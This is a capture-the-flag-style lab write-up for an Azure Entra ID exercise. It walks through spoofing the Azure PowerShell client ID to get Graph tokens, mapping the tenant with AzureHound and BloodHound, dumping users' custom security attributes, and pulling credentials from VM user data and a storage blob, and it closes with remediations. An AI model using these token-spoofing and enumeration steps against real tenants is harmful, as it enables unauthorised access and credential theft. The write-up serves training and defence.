## Disclosure
This documentation is intended for educational purposes only. All activities were performed within a controlled, authorized environment provided by [PwnedLabs](https://pwnedlabs.io/). This write-up focuses strictly on the methodology, vulnerability analysis, and security remediation techniques. All sensitive identifiers, including credentials, tokens, and specific PII, have been redacted or generalized to comply with security best practices and the platform's Terms of Service. The intent of this content is to foster professional development and contribute to the cybersecurity community's knowledge base.

**The lab:** https://pwnedlabs.io/labs/intro-to-azure-recon-with-bloodhound

---
## Vulnerability Summary
This lab demonstrates a complete **Identity-to-Infrastructure attack path** within a Microsoft Entra ID (Azure AD) environment, utilizing graph-based analysis to uncover privilege escalation vectors.

1. **Reconnaissance with AzureHound**: By spoofing the legitimate Azure PowerShell client ID, an attacker can obtain tokens for the Microsoft Graph API. This allows the use of `AzureHound` to map the entire tenant structure, including users, groups, roles, and administrative relationships.
2. **Graph-Based Analysis**: `BloodHound` visualizes the complex web of Entra ID permissions. In this scenario, the attacker identifies that the compromised user holds multiple directory roles, specifically those related to **Custom Security Attributes**.
3. **Information Disclosure**: Leveraging `Attribute Assignment Reader` permissions, the attacker iterates through all tenant users to exfiltrate custom attributes, which often contain sensitive metadata or configuration markers.
4. **Lateral Movement & Credential Harvesting**: The attack path leads to the `SECURITY-PC` VM. The attacker discovers an Azure role assignment that provides access to the VM's `UserData`. This metadata contains embedded credentials and instructions for accessing a storage account (`securityconfigs`), ultimately leading to the recovery of **Global Administrator** credentials.

---
## Walkthrough
### **Install Docker and Docker Compose**
1. **Update your system**:
```bash
sudo apt update && sudo apt upgrade
```
2. **Install Docker**:
```bash
sudo apt install docker.io
```
3. **Enable Docker**:
```bash
sudo systemctl enable docker --now
```
4. **Install Docker Compose**:
```bash
sudo apt install docker-compose
```

### **Run BloodHound**

Once Docker and Docker Compose are installed, download and launch BloodHound CE:
```bash
curl -L https://ghst.ly/getbhce -o bloodhound.yml
sudo docker-compose -f bloodhound.yml up
```

This command sets up everything for you, and with BloodHound CE we no longer have to configure Neo4j. Pay attention to the terminal for the auto-generated password, which you'll use for the default `admin` user

We can also use `grep` to easily find the password.
```bash
docker logs $(docker ps --filter "name=bloodhound" -q) 2>&1 | grep "Initial Password Set To:"
```

---

Access bloodhound `http://localhost:8080/ui/login` go to `Download Collectors` and download `AzureHound`

Get the target Azure Entra ID by querying the OpenID configuration document and providing the name of the target domain in the URL:

```bash
apt install jq
curl -L login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration | jq
{
	  "token_endpoint": "https://login.microsoftonline.com/XXXXXX-XXXX-XXX-XXXX-XXXXXXXXXXX/oauth2/token",
...
```

1st suggested PowerShell commands from [AzureHound](https://bloodhound.specterops.io/collect-data/ce-collection/azurehound#dealing-with-multi-factor-auth-and-conditional-access-policies) obtains tokens for AzureHound collector by spoofing the Azure PowerShell clientID and request tokens for the Microsoft Graph API. Run `pwsh` and then:

```PowerShell
$body = @{
    "client_id" =     "1950a258-227b-4e31-a9cf-717495945fc2"
    "resource" =      "https://graph.microsoft.com"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers=@{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$authResponse
```

Go to the link and enter the device code. Sign in with the assumed creds.

Now, run the 2nd suggested PowerShell commands from the AzureHound documentation. These commands obtains new tokens:

```PowerShell
$body=@{
   "client_id" =  "1950a258-227b-4e31-a9cf-717495945fc2"
   "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
   "code" =       $authResponse.device_code
}
$Tokens = Invoke-RestMethod `
   -UseBasicParsing `
   -Method Post `
   -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
   -Headers $Headers `
   -Body $body
$Tokens
```

If you get an error, run 1st commands then 2nd commands right after user is authenticated with device code.

Using the Refresh Token in the newly saved `$Tokens.refresh_token` variable, the AzureHound binary can be used with the `list` argument to collect all Azure Tenant data:

```PowerShell
./azurehound -r $Tokens.refresh_token list --tenant "XXXXXX-XXXX-XXX-XXXX-XXXXXXXXXXX" -o output.json
```

"Ingest `output.json` into BloodHound. Search for `Jose` add him to owned. Enumerate his permissions and the full list of Azure edges is available in the official BloodHound [documentation](https://bloodhound.specterops.io/resources/edges/overview) .

We see that our user is a member of five Azure AD (Entra ID) admin roles. After clicking this field the graph updates, showing a directly assigned role named `UPDATE MANAGER` four roles inherited from the `IT-Helpdesk` group.
- **UPDATE MANAGER**: This is a custom directory role. On clicking the role we see the description "Allows helpdesk staff to update the manager role when users change teams". This doesn't seem too interesting from a security perspective.
- **DIRECTORY READERS**: This directory role that allows users to read basic directory information, excluding sensitive data values.
- **PRINTER TECHNICIAN**: This role allows users to register and unregister printers and update printer status. In our current scenario this also doesn't seem too interesting from a security perspective. (INTERESTING)
- **ATTRIBUTE DEFINITION READER**: This is a new directory role that allows members to read the definition of custom security attributes.
- **ATTRIBUTE ASSIGNMENT READER**: This is a new directory role that allows members to read custom security attribute keys and values for supported Microsoft Entra objects. (INTERESTING)

Looking at the official Microsoft [documentation](https://learn.microsoft.com/en-us/entra/identity/users/users-custom-security-attributes?tabs=ms-powershell#get-the-custom-security-attribute-assignments-for-a-user) for custom security attributes we see how to query them, and can create a snippet to loop through all Azure users instead of manually going through each one in the console."

First, open a PowerShell terminal and install the Microsoft Graph module with the command `Install-Module Microsoft.Graph` :

```PowerShell
# Connect to Microsoft Graph
Connect-MgGraph -UseDeviceAuthentication

# Retrieve all users
$allUsers = Get-MgUser -All

# Loop through all users and retrieve their custom security attributes
foreach ($user in $allUsers) {
    $userAttributes = Get-MgUser -UserId $user.Id -Property "customSecurityAttributes"
    
    # Display the additional properties of custom security attributes for each user
    Write-Host "User: $($user.UserPrincipalName)"
    $userAttributes.CustomSecurityAttributes.AdditionalProperties | Format-List
    Write-Host "---------------------------------------------"
}
```

We get all the Entra ID users.

Log into the Azure Portal as `Jose` to enumerate. Search for `groups` or navigate to `Microsoft Entra ID` and click `Groups` . Click on `IT-Helpdesk` to bring up its properties. Now click `Azure role assignments`.  We see an Azure role assignment to the `Reader` role, with the scope set to the `SECURITY-PC` VM.

We could also have found this using the PowerShell Az module. First, we must authenticate with `Connect-AzAccount`.

```PowerShell
Connect-AzAccount
Get-AzRoleAssignment
```

Open the `SECURITY-PC` VM. Clicking on `Operating system` , under the `User data` section we see that an Azure CLI command has been added, including a comment with credentials!

```bash
# Credentials: User: <USER> | Password: <PASSWORD>
az storage blob download --account-name securityconfigs --container-name security-pc --name config-latest.xml --auth-mode login
```

We could also get the VM `User data `this way from CLI:

```PowerShell
Install-Module -Name Az -Repository PSGallery -Force
Connect-AzAccount
Get-AzVM -ResourceGroupName "content-static-2" -Name "SECURITY-PC" -UserData
	UserData : <BASE64>
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<BASE64>"))
```

Re-login with new creds and run the command from `User data`:

```bash
az login --use-device-code
az storage blob download --account-name securityconfigs --container-name security-pc --name config-latest.xml --auth-mode login
```

This reveals the `config-latest.xml` which contains numerous sensitive credentials including the Global Administrator account.

We can also access this file using the console. Log into Azure as `security-user@megabigtech.com` and search for `storage accounts` . Click on `securityconfigs` , `Data Storage`, and then click on `Containers` . Click `security-pc` and then access the file. The container also contains the flag for this lab.

---
## Remediations
1. **Restrict Sensitive Roles**:
   - Audit the assignment of directory roles. Roles like `Attribute Assignment Reader` or `Global Reader` are highly sensitive and should be assigned strictly based on the principle of least privilege.
   - Regularly review and clean up unused custom directory roles.

2. **Secure Instance Metadata & User Data**:
   - **Do not store secrets, passwords, or connection strings in VM User Data**, environment variables, or configuration scripts. 
   - Use `Azure Key Vault` for secret management, and grant the VM a `Managed Identity` to access the vault securely without requiring hardcoded credentials.

3. **Limit Graph API Exposure**:
   - Monitor for anomalous service principal logins, particularly those utilizing public client IDs (like the Azure PowerShell client ID used for `AzureHound`).
   - Implement **Conditional Access Policies** to require MFA for all access to the Microsoft Graph API.

4. **Continuous Monitoring**:
   - Enable **Microsoft Entra ID Protection** to detect risky sign-ins and identity-based threats.
   - Use **Microsoft Defender for Cloud** to identify misconfigurations in storage accounts and VMs that could lead to credential exposure.
